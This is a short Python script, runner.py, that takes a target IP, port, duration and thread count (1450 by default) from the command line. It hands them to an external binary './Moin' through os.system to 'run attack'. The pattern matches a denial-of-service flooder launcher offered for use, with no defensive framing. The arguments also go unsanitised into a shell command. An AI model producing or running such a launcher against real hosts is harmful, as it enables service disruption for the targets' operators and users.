import sys
import os

def run_attack(ip, port, time, threads=1450):
    print(f"Running attack on {ip}:{port} for {time}s with {threads} threads")
    os.system(f"./Moin {ip} {port} {time} {threads}")

if len(sys.argv) < 4:
    print("Usage: python3 runner.py <ip> <port> <time> [threads]")
    sys.exit(1)

ip = sys.argv[1]
port = sys.argv[2]
time = sys.argv[3]
threads = int(sys.argv[4]) if len(sys.argv) > 4 else 1450

run_attack(ip, port, time, threads)
